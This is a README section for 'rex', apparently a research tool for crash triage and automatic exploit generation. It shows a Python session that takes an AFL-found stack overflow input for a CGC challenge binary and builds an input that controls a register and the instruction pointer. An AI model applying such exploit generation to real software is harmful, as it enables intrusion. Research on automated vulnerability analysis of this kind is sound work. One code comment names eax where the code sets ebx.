### Rex

At the moment rex offers two main features, crash triaging and exploitation for certain kinds of crashes.

In the example below we take a crashing input for `0b32aa01_01` discovered by AFL. The vulnerability is a simple buffer overflow on the stack.

Exploit objects can take an exploitable crashing input and will attempt to turn it into an exploit which can set
set every register and leak data from an arbitrary address.

```
>>> crash = rex.Crash("../binaries/cgc_scored_event_1/cgc/0b32aa01_01", "\x05\x00\xff\xff\x80\xff\xff\xff\x80\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xff\xff\x80\xf1\xf1\xf1\xeb\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\xf1\x00\xde\x7f\xff\x80\xff\xff\xff\x80\x0f\xff\xff\xff~\xf3\xff\xff\xff\xff\x7f\xff\xff\x80\xff\xff\xfe\xff\t\xfe\xfe\xfe\xfe\xfe\nWelc\xfeme to(Palindrome Fiwder\n\n\xff\xff\xff\xff\x80\xff\xff\xe8\x80\x0f\xff\xff\xff\x7f#\n")
>>> crash.exploitable()
True
>>> exploit = rex.Exploit(crash)
>>> exploit.initialize()
>>> # create an input which populates eax with 0x41414141 and crashes with eip at 0x58585858
>>> exploit.set_register("ebx", 0x41414141, final_ip=0x58585858) 
'\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8e\x81\x04\x08\x00\x00\x00\x00\x84\xc5EIAAAAXXXX\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```
